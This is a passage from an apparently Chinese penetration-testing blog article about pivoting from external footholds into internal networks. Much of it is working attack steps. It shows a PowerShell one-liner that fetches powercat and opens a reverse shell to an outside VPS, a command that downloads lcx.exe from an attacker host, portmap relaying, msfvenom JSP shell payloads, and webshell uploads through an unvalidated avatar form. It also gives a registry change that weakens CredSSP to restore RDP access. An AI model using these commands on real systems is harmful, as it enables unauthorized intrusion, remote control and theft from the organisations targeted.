BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">因为资产给的有时候是整几个网段，所以爆破的话能够成功的概率也是挺大的。</p><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">这里推荐使用<strong>超级弱口令检查工具</strong>这个工具，在 github 上也可以找到。勾选上所有的数据库的选项，把用户名和密码字典导入，勾选上扫描端口。</p><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">运气好的话还是可以出结果的。</p><p style="text-align: center;"><img class="rich_pages" data-copyright="0" data-ratio="0.3378076062639821" data-s="300,640" src="图片/HACK学习呀_2019-06-03_从外网到内网的渗透姿势分享/5_pYLrmqz4keTPssSrIe6SvGYTnZfiaA.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou84HHLODqg37JF7iaFVyFWYAZpsBR9kNndhfDDl8ibKHcxKgYhpYLrmqz4keTPssSrIe6SvGYTnZfiaA/640?wx_fmt=png'" data-type="png" data-w="1341" style=""  /></p><h4 style="margin-top: 1em;margin-bottom: 16px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-weight: bold;line-height: 1.4;text-rendering: optimizelegibility;font-size:18px;line-height:38px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">内网数据库爆破</h4><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">这里推荐使用 F-Scrack 和 DBScanner 工具，在 github 上面都有，进入内网之后弱口令比较多，扫描爆破的效果还是不错的。</p><h2 style="margin-top: 1em;margin-bottom: 16px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-weight: bold;line-height: 1.225;text-rendering: optimizelegibility;font-size:24px;line-height:44px;;padding-bottom: 0em;border-bottom: none;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">从 webshell 到内网</h2><h3 style="margin-top: 1em;margin-bottom: 16px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-weight: bold;line-height: 1.43;text-rendering: optimizelegibility;font-size:20px;line-height:40px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">从 sql 注入到内网渗透</h3><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">直接举例。</p><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">拿到一个 mssql 注入，并且可以开启 xp_cmdshell 设置执行任意命令的情况下（--os-shell）。如果注入是属于回显、报错注入的话，直接执行命令就没有太大的限制，<strong>如果是延时注入的话，要等很长时间才能回显，这就比较恶心了。</strong></p><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">举个例子，像下面这种注入的话就是属于无页面回显，只能靠时间盲注才能出数据，根据时间盲注是一个字符一个字符的出数据，速度就会慢很多，而且有时候还不稳定。</p><p style="text-align: center;"><img class="rich_pages" data-copyright="0" data-ratio="0.5287958115183246" data-s="300,640" src="图片/HACK学习呀_2019-06-03_从外网到内网的渗透姿势分享/6_iaFwP0uTsjOq1m1hK5gicelVgx1DEg.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou84HHLODqg37JF7iaFVyFWYAiaMCF6fdUMVyjNEdkqZIH9j1ep9iaFwP0uTsjOq1m1hK5gicelVgx1DEg/640?wx_fmt=png'" data-type="png" data-w="1146" style=""  /></p><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><strong>解决方法：</strong><br  />在 sqlmap 下获取 xp_cmdshell 之后，直接执行：</p><pre style="padding: 16px;font-variant-numeric: normal;font-variant-east-asian: normal;font-stretch: normal;font-size: 12.75px;line-height: 1.6;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;border-radius: 3px;margin-bottom: 24px;word-break: break-all;overflow-wrap: normal;white-space: pre-wrap;background-color: rgb(247, 247, 247);border-width: 1px;border-style: solid;border-color: rgba(0, 0, 0, 0.15);overflow: auto;letter-spacing: 0.75px;text-align: start;"><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;color: inherit;border-radius: 3px;white-space: pre;background: transparent;border-width: 0px;border-style: initial;border-color: initial;word-break: normal;display: inline;max-width: initial;overflow: initial;line-height: inherit;overflow-wrap: normal;">powershell IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1');powercat -c 123.207.xx.xx -p 9999 -e cmd</code></pre><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">在 vps 上监听一个 9999 端口，等着弹回 shell （system32 下的 cmd）就行了。然后拿到 shell 之后继续使用 powershell 下载远程木马或者端口到靶机上就行了。</p><p style="text-align: center;"><img class="rich_pages" data-copyright="0" data-ratio="0.5612903225806452" data-s="300,640" src="图片/HACK学习呀_2019-06-03_从外网到内网的渗透姿势分享/7_XKUNdndrlMfXz0PQsY7v7IWJTYiarQ.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou84HHLODqg37JF7iaFVyFWYAp2IX8zbK3QMBD0tH4nMWSMqBEXKUNdndrlMfXz0PQsY7v7IWJTYiarQ/640?wx_fmt=png'" data-type="png" data-w="1240" style=""  /></p><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">powershell 下载远程文件命令：</p><p>下载 lcx 到本地进行 3389 端口转发</p><pre style="padding: 16px;font-variant-numeric: normal;font-variant-east-asian: normal;font-stretch: normal;font-size: 12.75px;line-height: 1.6;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;border-radius: 3px;margin-bottom: 24px;word-break: break-all;overflow-wrap: normal;white-space: pre-wrap;background-color: rgb(247, 247, 247);border-width: 1px;border-style: solid;border-color: rgba(0, 0, 0, 0.15);overflow: auto;letter-spacing: 0.75px;text-align: start;"><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;color: inherit;border-radius: 3px;white-space: pre;background: transparent;border-width: 0px;border-style: initial;border-color: initial;word-break: normal;display: inline;max-width: initial;overflow: initial;line-height: inherit;overflow-wrap: normal;">powershell "$c=new-Object \"System.Net.WebClient\";$c.DownloadFile(\"http://123.207.xx.xx:81/static/lcx.exe\",\"C:/Users/Administrator/Desktop/lcx.exe\");";</code></pre><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">第二个参数填入保存到的路径即可和保存的文件名即可。</p><p>若公网跳板机是 linux 的话，可以使用 linux 版本的 lcx，也就是 portmap</p><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">用法：</p><pre style="padding: 16px;font-variant-numeric: normal;font-variant-east-asian: normal;font-stretch: normal;font-size: 12.75px;line-height: 1.6;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;border-radius: 3px;margin-bottom: 24px;word-break: break-all;overflow-wrap: normal;white-space: pre-wrap;background-color: rgb(247, 247, 247);border-width: 1px;border-style: solid;border-color: rgba(0, 0, 0, 0.15);overflow: auto;letter-spacing: 0.75px;text-align: start;"><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;color: inherit;border-radius: 3px;white-space: pre;background: transparent;border-width: 0px;border-style: initial;border-color: initial;word-break: normal;display: inline;max-width: initial;overflow: initial;line-height: inherit;overflow-wrap: normal;">./portmap -m 2 -p1 7777 -h2 211.141.xx.xx -p2 9999</code></pre><p>这里的 h2 是远程服务的 ip 地址。</p><h3 style="margin-top: 1em;margin-bottom: 16px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-weight: bold;line-height: 1.43;text-rendering: optimizelegibility;font-size:20px;line-height:40px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">从 S2-045 到内网渗透</h3><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">检测 S2 的方法就不说了，直接工具一把梭。这里推荐使用 "Struts2漏洞检查工具2018版" 这个工具，可以批量导入 url ，效率还是可以的。但是能不能出洞主要还是看运气看人品哈哈哈。</p><p style="text-align: center;"><img class="rich_pages" data-copyright="0" data-ratio="0.7988394584139265" data-s="300,640" src="图片/HACK学习呀_2019-06-03_从外网到内网的渗透姿势分享/8_2vutxmL0ibzozCxE8OLedPMh4SOlPA.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou84HHLODqg37JF7iaFVyFWYAZwZSLbHJSIcicX8MGREK75D9sQ2vutxmL0ibzozCxE8OLedPMh4SOlPA/640?wx_fmt=png'" data-type="png" data-w="1034" style=""  /></p><p><strong>简单检测 S2 漏洞的方法：看 Uri 的后缀是否为 .do 或者 .action</strong>，是的话直接丢进去工具验证。</p><h4 style="margin-top: 1em;margin-bottom: 16px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-weight: bold;line-height: 1.4;text-rendering: optimizelegibility;font-size:18px;line-height:38px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">获取 S2 之后的操作步骤</h4><p>第一个方法就是上面说的，有 powershell 的话直接一把梭 getshell。或者可以配合 Empire 生成一个 powershell 的 payload 直接运行。但是这种方法有时候因为种种原因会不太稳定。</p><p>第二种方法可以用上面那个工具进行文件上传传小马上去，接着用小马客户端传大马就行了，这是常规套路。</p><p style="text-align: center;"><img class="rich_pages" data-copyright="0" data-ratio="0.640183346065699" data-s="300,640" src="图片/HACK学习呀_2019-06-03_从外网到内网的渗透姿势分享/9_eSwq1zKaM6EOFTYlHNp9WDIUehZvKw.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou84HHLODqg37JF7iaFVyFWYADaHp9gwpaia2ibuomAcPoyeUc8eSwq1zKaM6EOFTYlHNp9WDIUehZvKw/640?wx_fmt=png'" data-type="png" data-w="1309" style=""  /></p><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">Q：拿到大马之后要干啥？<br  />A：当然要进一步渗透了，内网渗透、域渗透。</p><hr style="margin-top: 15px;margin-bottom: 15px;border-top: 0px;border-right: 0px;border-left: 0px;border-bottom-style: solid;border-bottom-color: rgb(221, 221, 221);box-sizing: content-box;height: 0px;background: rgb(255, 255, 255);font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;"  /><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">Q: 但是具体怎么做？<br  />A: 先 ipconfig 看看是不是内网 IP，如果是的话就传个 msf 马上去进一步操作，或者用 lcx 或者 ew 把 3389 转发到公网。</p><hr style="margin-top: 15px;margin-bottom: 15px;border-top: 0px;border-right: 0px;border-left: 0px;border-bottom-style: solid;border-bottom-color: rgb(221, 221, 221);box-sizing: content-box;height: 0px;background: rgb(255, 255, 255);font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;"  /><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">Q: 但是要怎么传呢？直接使用大马的上传功能吗？<br  />A: 不行。因为 jsp 的上传只支持可见字符字节码的上传，二进制数据没办法直接上传。</p><hr style="margin-top: 15px;margin-bottom: 15px;border-top: 0px;border-right: 0px;border-left: 0px;border-bottom-style: solid;border-bottom-color: rgb(221, 221, 221);box-sizing: content-box;height: 0px;background: rgb(255, 255, 255);font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;"  /><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">Q: 那该如何操作？<br  />A: 我这里是用 Base64 编码的方式，先把 exe 文件整个编码，之后构造一个 jsp 的上传点，在上传完成之后在网站目录下解码即可，解码之后就释放到网站目录下了。</p><p style="margin-top: 16px;margin-bottom: 24px;">参考：https://blog.51cto.com/0x007/1204440</p><p style="margin-top: 16px;margin-bottom: 24px;">在实战环境下遇到的几乎都是 jsp 的站点，php 的站非常少，所以需要平时多积累多练习一下对 jsp 站点的渗透</p><h3 style="margin-top: 1em;margin-bottom: 16px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-weight: bold;line-height: 1.43;text-rendering: optimizelegibility;font-size:20px;line-height:40px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">从文件上传 getshell 到内网</h3><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">测试过程遇到一个比较奇葩的文件上传漏洞，发生在后台用户头像上传处，可以抓包直接修改上传的文件后缀为 jsp 文件，就可以直接进行上传，无任何验证，且上传完成后还会返回给你整个马子的路径。</p><p style="text-align: center;"><img class="rich_pages" data-copyright="0" data-ratio="0.6656912948061449" data-s="300,640" src="图片/HACK学习呀_2019-06-03_从外网到内网的渗透姿势分享/10_5C8uYD7ORS6Nu5icOENcicIQluwALw.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou84HHLODqg37JF7iaFVyFWYAhydBm1XYGfIeRt0L5zS6WYBC4Y5C8uYD7ORS6Nu5icOENcicIQluwALw/640?wx_fmt=png'" data-type="png" data-w="1367" style=""  /></p><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">可以直接上传木马的话，就可以直接上大马或者用 msf 直接生成一个 jsp 马（msfvenom）。</p><pre style="padding: 16px;font-variant-numeric: normal;font-variant-east-asian: normal;font-stretch: normal;font-size: 12.75px;line-height: 1.6;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;border-radius: 3px;margin-bottom: 24px;word-break: break-all;overflow-wrap: normal;white-space: pre-wrap;background-color: rgb(247, 247, 247);border-width: 1px;border-style: solid;border-color: rgba(0, 0, 0, 0.15);overflow: auto;letter-spacing: 0.75px;text-align: start;"><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;color: inherit;border-radius: 3px;white-space: pre;background: transparent;border-width: 0px;border-style: initial;border-color: initial;word-break: normal;display: inline;max-width: initial;overflow: initial;line-height: inherit;overflow-wrap: normal;">java/jsp_shell_bind_tcp         // 用于本地没有外网 IP 或者远程的靶机无法外连的情况<br  />java/jsp_shell_reverse_tcp      // 用于本地有公网 IP 的情况</code></pre><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">将生成的 payload 直接通过文件上传上去，接着拿到路径直接访问即可，在 msf 里可以升级到 meterpreter 之后就可以为所欲为了。</p><h2 style="margin-top: 1em;margin-bottom: 16px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-weight: bold;line-height: 1.225;text-rendering: optimizelegibility;font-size:24px;line-height:44px;;padding-bottom: 0em;border-bottom: none;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">可能会遇到的一些问题</h2><p>拿到 shell，将 3389 端口转发出来之后，尝试连接发现出现问题，估计是限制了我这边的 IP 访问。</p><p style="text-align: center;"><img class="rich_pages" data-copyright="0" data-ratio="0.398876404494382" data-s="300,640" src="图片/HACK学习呀_2019-06-03_从外网到内网的渗透姿势分享/11_BagbvUPdKNQe4GPYAYMml33WHWVicQ.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou84HHLODqg37JF7iaFVyFWYApufLbu2H6zupaibdgTdvZelJ4PBagbvUPdKNQe4GPYAYMml33WHWVicQ/640?wx_fmt=png'" data-type="png" data-w="890" style=""  /></p><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">解决方法：添加注册表&nbsp;<code style="padding-top: 0.2em;padding-bottom: 0.2em;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;font-size: 12.75px;color: rgb(221, 17, 68);border-radius: 3px;background-color: rgba(0, 0, 0, 0.04);word-break: break-all;border-width: initial !important;border-style: none !important;border-color: initial !important;">AllowEncryptionOracle</code>&nbsp;项即可。</p><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">参考：https://www.cnblogs.com/lindajia/p/9021082.html</p><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">一条命令直接解决（需要在 system32 目录下的 cmd 中执行）：</p><pre style="padding: 16px;font-variant-numeric: normal;font-variant-east-asian: normal;font-stretch: normal;font-size: 12.75px;line-height: 1.6;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;border-radius: 3px;margin-bottom: 24px;word-break: break-all;overflow-wrap: normal;white-space: pre-wrap;background-color: rgb(247, 247, 247);border-width: 1px;border-style: solid;border-color: rgba(0, 0, 0, 0.15);overflow: auto;letter-spacing: 0.75px;text-align: start;"><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;color: inherit;border-radius: 3px;white-space: pre;background: transparent;border-width: 0px;border-style: initial;border-color: initial;word-break: normal;display: inline;max-width: initial;overflow: initial;line-height: inherit;overflow-wrap: normal;">REG add HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\CredSSP\Parameters /v AllowEncryptionOracle /t REG_DWORD /d 2 /f</code></pre><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">.<span style="font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;font-size:17px;line-height:37px;;text-align: justify;">将 msf 代理进内网</span></p><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">直接使用命令：</p><pre style="padding: 16px;font-variant-numeric: normal;font-variant-east-asian: normal;font-stretch: normal;font-size: 12.75px;line-height: 1.6;font family: 